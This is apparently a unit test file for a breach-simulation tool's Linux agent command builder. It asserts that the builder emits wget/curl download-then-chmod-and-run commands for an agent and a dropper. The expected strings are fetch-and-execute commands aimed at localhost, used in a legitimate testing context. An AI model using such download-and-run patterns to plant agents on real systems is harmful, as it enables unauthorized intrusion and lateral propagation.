from pathlib import PurePosixPath

import pytest
from tests.unit_tests.common.command_builder.conftest import (
    AGENT_ID,
    AGENT_OTP_ENVIRONMENT_VARIABLE,
    DEPTH,
    OTP,
    SERVERS,
)

from common.command_builder import (
    DropperExecutionMode,
    IAgentCommandBuilderFactory,
    ILinuxAgentCommandBuilder,
    LinuxDownloadMethod,
    LinuxDownloadOptions,
    LinuxRunOptions,
)
from infection_monkey.model import DROPPER_ARG, MONKEY_ARG
from infection_monkey.utils.commands import build_monkey_commandline_parameters

AGENT_DESTINATION_PATH = PurePosixPath("/tmp/agent")
DROPPER_DESTINATION_PATH = PurePosixPath("/tmp/dropper")
DOWNLOAD_URL = "http://127.0.0.1/agent"


@pytest.fixture
def expected_monkey_agent_arguments() -> str:
    return " ".join(
        build_monkey_commandline_parameters(
            parent=AGENT_ID, servers=SERVERS, depth=DEPTH, location=None
        )
    )


@pytest.fixture
def expected_dropper_agent_arguments() -> str:
    return " ".join(
        build_monkey_commandline_parameters(
            parent=AGENT_ID, servers=SERVERS, depth=DEPTH, location=DROPPER_DESTINATION_PATH
        )
    )


@pytest.fixture
def linux_agent_command_builder(
    agent_command_builder_factory: IAgentCommandBuilderFactory,
) -> ILinuxAgentCommandBuilder:
    return agent_command_builder_factory.create_linux_agent_command_builder()


def test_initial_command(linux_agent_command_builder: ILinuxAgentCommandBuilder):
    assert linux_agent_command_builder.get_command() == ""


@pytest.mark.parametrize(
    "expected_command, download_method",
    [
        (
            (
                f"wget -qO {AGENT_DESTINATION_PATH} {DOWNLOAD_URL}; "
                f"chmod +x {AGENT_DESTINATION_PATH} ; "
            ),
            LinuxDownloadMethod.WGET,
        ),
        (
            (
                f"curl -so {AGENT_DESTINATION_PATH} {DOWNLOAD_URL}; "
                f"chmod +x {AGENT_DESTINATION_PATH} ; "
            ),
            LinuxDownloadMethod.CURL,
        ),
    ],
)
def test_build_download_command(
    linux_agent_command_builder: ILinuxAgentCommandBuilder,
    expected_command: str,
    download_method: LinuxDownloadMethod,
):
    linux_download_options = LinuxDownloadOptions(
        agent_destination_path=AGENT_DESTINATION_PATH,
        download_method=download_method,
        download_url=DOWNLOAD_URL,
    )
    linux_agent_command_builder.build_download_command(linux_download_options)

    assert linux_agent_command_builder.get_command() == expected_command


def test_build_run_command_none(
    expected_monkey_agent_arguments: str, linux_agent_command_builder: ILinuxAgentCommandBuilder
):
    expected_command = (
        f"{AGENT_OTP_ENVIRONMENT_VARIABLE}={OTP} {AGENT_DESTINATION_PATH} "
        f"{MONKEY_ARG} {expected_monkey_agent_arguments}"
    )

    linux_run_options = LinuxRunOptions(
        agent_destination_path=AGENT_DESTINATION_PATH,
        dropper_execution_mode=DropperExecutionMode.NONE,
    )
    linux_agent_command_builder.build_run_command(linux_run_options)
    assert linux_agent_command_builder.get_command() == expected_command


def test_build_run_command_dropper(
    expected_dropper_agent_arguments: str, linux_agent_command_builder: ILinuxAgentCommandBuilder
):
    expected_command = (
        f"{AGENT_OTP_ENVIRONMENT_VARIABLE}={OTP} {AGENT_DESTINATION_PATH} "
        f"{DROPPER_ARG} {expected_dropper_agent_arguments}"
    )

    linux_run_options = LinuxRunOptions(
        agent_destination_path=AGENT_DESTINATION_PATH,
        dropper_execution_mode=DropperExecutionMode.DROPPER,
        dropper_destination_path=DROPPER_DESTINATION_PATH,
    )
    linux_agent_command_builder.build_run_command(linux_run_options)
    assert linux_agent_command_builder.get_command() == expected_command


def test_build_run_command_script(linux_agent_command_builder: ILinuxAgentCommandBuilder):
    expected_command = f"{AGENT_OTP_ENVIRONMENT_VARIABLE}={OTP} {AGENT_DESTINATION_PATH} "

    linux_run_options = LinuxRunOptions(
        agent_destination_path=AGENT_DESTINATION_PATH,
        dropper_execution_mode=DropperExecutionMode.SCRIPT,
    )
    linux_agent_command_builder.build_run_command(linux_run_options)
    assert linux_agent_command_builder.get_command() == expected_command


def test_command_reset(linux_agent_command_builder: ILinuxAgentCommandBuilder):
    expected_command = f"{AGENT_OTP_ENVIRONMENT_VARIABLE}={OTP} {AGENT_DESTINATION_PATH} "
    linux_download_options = LinuxDownloadOptions(
        agent_destination_path=AGENT_DESTINATION_PATH,
        download_method=LinuxDownloadMethod.WGET,
        download_url=DOWNLOAD_URL,
    )
    linux_run_options = LinuxRunOptions(
        agent_destination_path=AGENT_DESTINATION_PATH,
        dropper_execution_mode=DropperExecutionMode.SCRIPT,
    )

    linux_agent_command_builder.build_download_command(linux_download_options)
    linux_agent_command_builder.reset_command()
    assert linux_agent_command_builder.get_command() == ""

    linux_agent_command_builder.build_run_command(linux_run_options)
    assert linux_agent_command_builder.get_command() == expected_command
